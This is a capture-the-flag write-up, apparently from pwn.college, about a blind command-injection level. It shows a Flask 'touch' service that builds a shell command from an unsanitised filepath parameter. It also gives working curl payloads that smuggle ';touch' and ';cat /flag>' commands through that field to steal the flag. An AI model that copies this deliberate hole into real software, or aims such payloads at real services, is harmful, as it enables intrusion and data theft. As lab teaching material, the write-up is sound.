This level will not return the output of the command. So we'll need to do a blind injection attack.

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def challenge():
    filepath = flask.request.args.get("filepath", "/challenge")
    command = f"touch {filepath}"
    print(f"DEBUG: {command=}")

    subprocess.run(
        command,                    # the command to run
        shell=True,                 # use the shell to run this command
        stdout=subprocess.PIPE,     # capture the standard output
        stderr=subprocess.STDOUT,   # 2>&1
        encoding="latin"            # capture the resulting output as text
    )

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form><input type=text name=filepath><input type=submit value=Submit></form>
        <hr>
        <b>Ran the command: touch {filepath}</b>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

We can test whether our injection works by doing this:

```bash
curl -v "http://challenge.localhost:80/ filepath=/tmp/testing;touch%20/tmp/testing2"
```

This did create 2 files in `/tmp`: `testing` and `testing2`. So our injection works.

We can just `cat` the flag file and pipe the output into a file in our home directory, because files created by the server is readable to us. We can just run this:

```bash
curl -v "http://challenge.localhost:80/?filepath=/tmp/testing;cat%20/flag>/home/hacker/flag"; cat flag
```

> Note: I thought there's some error message that I could exploit, like grepping a certain character to try to brute force it by making a conditional where if the grep returns an output, it exits normally, else, it exits with an error code. Turns this level doesn't return the error code or give any indication of an error.